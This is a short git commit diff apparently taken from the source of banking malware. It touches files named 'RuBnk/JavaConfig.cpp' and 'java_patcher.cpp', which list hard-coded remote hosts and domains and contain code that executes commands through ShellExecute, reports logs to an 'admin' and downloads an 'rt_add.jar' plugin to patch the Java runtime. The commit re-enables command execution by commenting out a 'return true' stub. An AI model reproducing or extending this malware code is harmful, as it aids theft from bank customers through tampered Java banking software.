3d23049ff5a53d5850852dd19be100a42b2dd3d5
Igor@RIVSOFT <rivsoft1975@mail.ru>
2012-05-24 09:32:18 +0300

    -

--- source/RuBnk/JavaConfig.cpp
+++ source/RuBnk/JavaConfig.cpp
@@ -29,7 +29,7 @@
 	#else
 
 		//char JAVA_HOSTS[] = "88.198.35.59\0";
-//		char JAVA_HOSTS[] = //"192.168.0.250\0"
+//		char JAVA_HOSTS[] = "192.168.0.250\0";
 //							"bifitibsystem.org\0"
 //							"systemjavabindbo.org\0"
 //							"ibasystemdbaodomen.org\0"
--- source/RuBnk/java_patcher.cpp
+++ source/RuBnk/java_patcher.cpp
@@ -223,7 +223,7 @@ static void SendLogToAdmin( int num )
 
 static bool RunCmd( const char* exe, const char* cmd )
 {
-	//return true;
+//	return true;
 	SHELLEXECUTEINFOA in;
 	m_memset( &in, 0, sizeof(SHELLEXECUTEINFOA) );
 
@@ -491,6 +491,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 		default: addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
 	}
 	File::GetTempName(rtAddFilePath);
+//	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
 		return false;
 
